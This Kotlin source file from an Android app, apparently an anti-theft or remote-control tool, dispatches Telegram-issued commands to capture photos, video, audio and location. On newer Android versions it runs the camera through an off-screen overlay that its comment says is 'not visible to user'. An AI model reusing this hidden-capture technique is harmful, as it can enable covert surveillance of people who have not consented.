package com.save.me

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.SurfaceHolder
import android.view.View
import androidx.core.content.ContextCompat
import org.json.JSONObject

object ActionHandlers {
    fun dispatch(
        context: Context,
        type: String,
        camera: String? = null,
        flash: String? = null,
        quality: String? = null,
        duration: String? = null,
        chatId: String? = null
    ) {
        Log.d("ActionHandlers", "Dispatching type=$type camera=$camera flash=$flash quality=$quality duration=$duration chatId=$chatId")

        val deviceNickname = Preferences.getNickname(context) ?: "Device"
        if (!chatId.isNullOrBlank()) {
            val ackMsg = "[$deviceNickname] Command received: $type"
            UploadManager.init(context)
            UploadManager.sendTelegramMessage(chatId, ackMsg)
        }

        if (!checkPermissions(context, type)) {
            Log.e("ActionHandlers", "Required permissions not granted for $type")
            NotificationHelper.showNotification(
                context, "Permission Error",
                "Required permissions not granted for $type. Please allow all required permissions in system settings."
            )
            if (!chatId.isNullOrBlank()) {
                UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Required permissions not granted for $type.")
            }
            return
        }

        if (Build.VERSION.SDK_INT >= 34) {
            if (type == "photo" || type == "video") {
                if (!OverlayHelper.hasOverlayPermission(context)) {
                    OverlayHelper.requestOverlayPermission(context)
                    NotificationHelper.showNotification(
                        context,
                        "Permission Needed",
                        "Grant 'Display over other apps' for full background capability."
                    )
                    return
                }
                // Use user-friendly overlay: tiny and offscreen by default
                OverlayHelper.showSurfaceOverlay(
                    context,
                    callback = { surfaceHolder, overlayView ->
                        startCameraActionInvoke(
                            context,
                            type,
                            camera,
                            flash,
                            quality,
                            duration,
                            chatId,
                            surfaceHolder,
                            overlayView
                        )
                    },
                    overlaySizeDp = 64, // tiny preview
                    offScreen = true // not visible to user
                )
                return
            } else {
                if (OverlayHelper.hasOverlayPermission(context)) {
                    OverlayHelper.showViewOverlay(context, callback = { overlayView ->
                        if (overlayView == null) {
                            Log.e("ActionHandlers", "Audio/location overlay creation failed.")
                            return@showViewOverlay
                        }
                        Handler(Looper.getMainLooper()).postDelayed({
                            OverlayHelper.removeOverlay(context, overlayView)
                            startOtherActionInvoke(context, type, duration, chatId)
                        }, 400)
                    }, overlaySizeDp = 64, offScreen = true)
                    return
                }
            }
        } else {
            startCameraActionInvoke(context, type, camera, flash, quality, duration, chatId)
        }
    }

    private fun startCameraActionInvoke(
        context: Context,
        type: String,
        camera: String?,
        flash: String?,
        quality: String?,
        duration: String?,
        chatId: String?,
        surfaceHolder: SurfaceHolder? = null,
        overlayView: View? = null
    ) {
        val cam = camera ?: "front"
        val flashEnabled = flash == "true"
        val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
        val durationInt = duration?.toIntOrNull() ?: if (type == "photo") 0 else 60

        ForegroundActionService.startCameraAction(
            context,
            type,
            JSONObject().apply {
                put("camera", cam)
                put("flash", flashEnabled)
                put("quality", qualityInt)
                put("duration", durationInt)
            },
            chatId
        )
    }

    private fun startOtherActionInvoke(
        context: Context,
        type: String,
        duration: String?,
        chatId: String?
    ) {
        when (type) {
            "audio" -> {
                val durationInt = duration?.toIntOrNull() ?: 60
                ForegroundActionService.startAudioAction(
                    context,
                    JSONObject().apply {
                        put("duration", durationInt)
                    },
                    chatId
                )
            }
            "location" -> {
                ForegroundActionService.startLocationAction(context, chatId)
            }
            "ring" -> {
                ForegroundActionService.startRingAction(context, JSONObject())
            }
            "vibrate" -> {
                ForegroundActionService.startVibrateAction(context, JSONObject())
            }
            else -> {
                NotificationHelper.showNotification(context, "Unknown Action", "Action $type is not supported.")
                Log.w("ActionHandlers", "Unknown action type: $type")
                if (!chatId.isNullOrBlank()) {
                    val deviceNickname = Preferences.getNickname(context) ?: "Device"
                    val errMsg = "[$deviceNickname] Error: Action $type is not supported."
                    UploadManager.sendTelegramMessage(chatId, errMsg)
                }
            }
        }
    }

    private fun checkPermissions(context: Context, type: String): Boolean {
        fun has(p: String) = ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED
        if (type == "photo") {
            return has(android.Manifest.permission.CAMERA) &&
                    (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA))
        }
        if (type == "video") {
            return has(android.Manifest.permission.CAMERA) &&
                    has(android.Manifest.permission.RECORD_AUDIO) &&
                    (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA)) &&
                    (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE))
        }
        if (type == "audio") {
            return has(android.Manifest.permission.RECORD_AUDIO) &&
                    (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_MICROPHONE))
        }
        if (type == "location") {
            return (has(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
                    has(android.Manifest.permission.ACCESS_COARSE_LOCATION)) &&
                    (Build.VERSION.SDK_INT < 34 || has(android.Manifest.permission.FOREGROUND_SERVICE_LOCATION))
        }
        return true
    }
}